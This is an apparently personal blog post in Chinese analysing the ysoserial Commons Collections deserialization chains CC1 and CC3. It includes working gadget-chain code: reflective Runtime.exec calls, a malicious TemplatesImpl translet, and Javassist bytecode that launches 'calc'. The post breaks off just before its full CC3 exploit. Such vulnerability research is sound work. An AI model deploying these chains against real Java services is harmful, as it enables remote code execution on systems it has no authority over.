<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Java CC链1-5分析与总结 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Java CC链1-5分析与总结前言：在ysoserial工具中，CommonsCollection反序列化链一共有7条，本文对这七条链做一个分析与调试，并找出其中的相似点与不同点，最后给出自己的一些思考。（有时候，思路比细节更重要） 一、CommonsCollection1链   正常情况下，如果想要调用Runtime来执行任意命令，需要调用其静态方法getRuntime来获取一个实例对象，然后">
<meta property="og:type" content="article">
<meta property="og:title" content="Java CC链1-5分析与总结">
<meta property="og:url" content="http://example.com/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Java CC链1-5分析与总结前言：在ysoserial工具中，CommonsCollection反序列化链一共有7条，本文对这七条链做一个分析与调试，并找出其中的相似点与不同点，最后给出自己的一些思考。（有时候，思路比细节更重要） 一、CommonsCollection1链   正常情况下，如果想要调用Runtime来执行任意命令，需要调用其静态方法getRuntime来获取一个实例对象，然后">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%201.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%202.png">
<meta property="og:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled%203.png">
<meta property="article:published_time" content="2022-03-30T03:23:50.000Z">
<meta property="article:modified_time" content="2022-03-30T03:23:50.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Java CC链1-5分析与总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2022-03-30T03:23:50.000Z" itemprop="datePublished">2022-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Java CC链1-5分析与总结
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Java-CC链1-5分析与总结"><a href="#Java-CC链1-5分析与总结" class="headerlink" title="Java CC链1-5分析与总结"></a>Java CC链1-5分析与总结</h1><p>前言：在ysoserial工具中，CommonsCollection反序列化链一共有7条，本文对这七条链做一个分析与调试，并找出其中的相似点与不同点，最后给出自己的一些思考。（有时候，思路比细节更重要）</p>
<h2 id="一、CommonsCollection1链"><a href="#一、CommonsCollection1链" class="headerlink" title="一、CommonsCollection1链"></a>一、CommonsCollection1链</h2><p>   正常情况下，如果想要调用Runtime来执行任意命令，需要调用其静态方法getRuntime来获取一个实例对象，然后再调用其exec来执行命令。如果我们想通过反射的方式来进行调用，具体过程如下：</p>
<ul>
<li>通过反射获取getRuntime静态方法</li>
<li>调用getRuntime方法获取一个Runtime实例对象</li>
<li>通过反射获取exec方法，并将获取到的Runtime实例对象传入进行调用</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(clazz);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">method1.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  除了使用Runtime之外，还可以利用ProcessBuilder来执行命令，具体实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(String[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">method.invoke(object);</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CommonsCollection1链中，会调用到三个不同类的transformer方法，但最终利用到的是InvokerTransformer的transform方法，其方法具体实现如下：（这里删掉了部分异常语句）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">	<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">	<span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  其中iMethodName、iParamTypes、iArgs变量是该类的成员变量。在反序列化漏洞中，我们可以理解为，这三个变量是我们可以进行控制的。上面这个transformer方法，我们可以理解其功能为调用传入的input对象的任意public方法或者其静态方法。</p>
<p>  接下来看看ChainedTransformer类的transformer方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这里的关键就在于object变量，可以通过for循环来不断地更新。根据ysoserial上给出的Gadgets链，我们知道是LazyMap的get方法调用了这个transformer方法；我们继续向上追溯，在AnnotationInvocationHandler的invoke方法，通过调用this.memberValues.get(var4)方法，最终去触发LazyMap的get方法，而这里的var4变量为字符串。也就是说，我们最终传入transformer方法中的参数是不可控的。</p>
<p>   因此，这里又引入了另外一个类的transformer方法，即ConstantTransformer：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里的iConstant是成员变量，可控的。因此我们可以构造如下代码，当其调用ChainedTransformer的transformer方法后，不论传入的参数是任何值，都可以执行任意命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(runtime);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	constantTransformer,<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这里又有一个问题，Runtime类并没有实现Serializable接口，因此直接这样进行序列化和反序列化是不行的。解决这个问题就是采用反射的方式，来生成一个Runtime对象。（个人认为这也就是为什么反射在序列化过程中使用的比较多的一个原因吧，可能绝大多数的利用类都没有实现Serializable接口）</p>
<p>  接下来我们对上面这段代码进行修改，让其通过反射来生成一个Runtime对象，并最终达到命令执行的效果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">          constantTransformer,</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  到这里，CC1链的核心部分就构造完成了，接下来要做的就是寻找调用链，让其最终可以调用到transform方法。</p>
<p>  前面说到过，LazyMap的get方法会调用到transform方法，我们继续向上追溯，可以发现在AnnotationInvocationHandler的invoke方法中调用了this.memberValues.get(var4)方法，这里就很容易想到动态代理了，在AnnotationInvocationHandler的readObject中，会调用到this.memberValues.entrySet方法，我们将这个this.memberValues设置成Map的代理对象，就可以构造整条链了，具体过程如下：</p>
<ul>
<li>先构造一个Map的代理对象</li>
<li>将其封装到AnnotationInvocationHandler的this.memberValues成员变量中</li>
<li>调用AnnotationInvocationHandler的readObject之后，会调用我们构造的代理类的invoke方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,map);</span><br></pre></td></tr></table></figure>

<p>   到此，我们将invocationHandler1序列化之后，当反序列化这个数据流时，就会执行我们指定的任意命令。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled.png" alt="Untitled"></p>
<h2 id="二、CommonsCollection3链"><a href="#二、CommonsCollection3链" class="headerlink" title="二、CommonsCollection3链"></a>二、CommonsCollection3链</h2><p>  接下来看看CC3这条链，它是CC1链的一个改进版本，它使用了InstantiateTransformer类来替换InvokerTransformer。可以简单看看这个InstantiateTransformer.transform方法的具体实现：（其功能就是实例化一个对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure>

<p>  在CC3链中，会用到一个TemplateImpl类，这个类在Java反序列化中用的比较多，比如JDK7u21也会用到这个类，我们接下来简单分析一下该类的作用以及利用过程，这里直接给出利用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">	-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">		-&gt; TemplatesImpl.getTransletInstance()</span><br><span class="line">			-&gt; TemplatesImpl.defineTransletClasses()</span><br><span class="line">				-&gt; loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>

<p>  最终这条链利用的是defineClass来加载字节码从而达到任意命令执行的效果，在构建这个对象的时候，需要指定三个成员变量，分别为：_name、_bytecodes、_tfactory；其中_name和_tfactory的构造是为了最终能够执行到defineClass函数，而_bytecodes是真正的字节码部分。</p>
<p>  在TemplatesImpl.getTransletInstance方法中，需要指定_name为非空，从而跳过条件语句的执行，成功调用到TemplatesImpl.defineTransletClasses方法；在TemplatesImpl.defineTransletClasses方法中，需要设置_tfactory的值，让其调用getExternalExtensionsMap方法不出错就行。（有兴趣的话可以自己调试分析看看，这里就不说细节了）</p>
<p>  接下来我们要做的就是构造_bytecodes这个部分，这里也有一个限制，就是构造的恶意类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类（因为在调用defineClass后，程序会回到getTransletInstance方法中，在实例化之前，对传入的恶意类做了一个检测）；之后就是编写恶意类，并将其编译后的字节码信息传入这个变量了，这里有两种方式可以进行构造，一种是直接本地编译一个恶意类，然后读取字节码信息传入这个bytes数组；另一种方式是利用javassist来构造恶意类字节码。这里我用两种方式都尝试一下：</p>
<h3 id="1、编译成class文件，获取字节码信息"><a href="#1、编译成class文件，获取字节码信息" class="headerlink" title="1、编译成class文件，获取字节码信息"></a>1、编译成class文件，获取字节码信息</h3><p>  恶意类的编写如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  编译成class文件之后，获取字节码信息传给_bytecodes，调用newTransformer方法即可触发：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DataInputStream</span> <span class="variable">dataInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\Evil.class&quot;</span>)));</span><br><span class="line">        <span class="type">int</span> <span class="variable">available</span> <span class="operator">=</span> dataInputStream.available();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[available];</span><br><span class="line">        dataInputStream.read(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        object.newTransformer();</span><br></pre></td></tr></table></figure>

<h3 id="2、利用Javassist来构造字节码信息"><a href="#2、利用Javassist来构造字节码信息" class="headerlink" title="2、利用Javassist来构造字节码信息"></a>2、利用Javassist来构造字节码信息</h3><p>  上面是自定义了一个java文件，然后将其编译成class文件后，通过文件读取的方式获取字节码信息，从而传给_bytecodes成员变量；另外一种生成字节码的方式就是利用javassist，来动态生成相关字节码信息，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">object.newTransformer();</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CC3链中，前面的部分和CC1一样，都是通过动态代理的方式，最终调用LazyMap.get方法来执行ChainedTransformer.transform方法；前面有说过，InstantiateTransformer.transform方法就是实例化一个对象（调用某个类的构造方法），因此查找链的思路就是寻找一个类，在其调用构造方法时候，会调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法，因此这里利用到com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，可以看看这个类的构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">	_templates = templates;</span><br><span class="line">	_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">	_transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">	_overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里调用了templates.newTransformer方法，我们只需要构造这个templates成员变量即可。所以，我们只需要修改ChainedTransformer中的内容即可；构造代码如下：（其中object为我们上面构造的TemplatesImpl实例对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br></pre></td></tr></table></figure>

<p>  当调用到chainedTransformer.transform方法后，就会执行恶意代码，最终完整的利用代码为：</p>
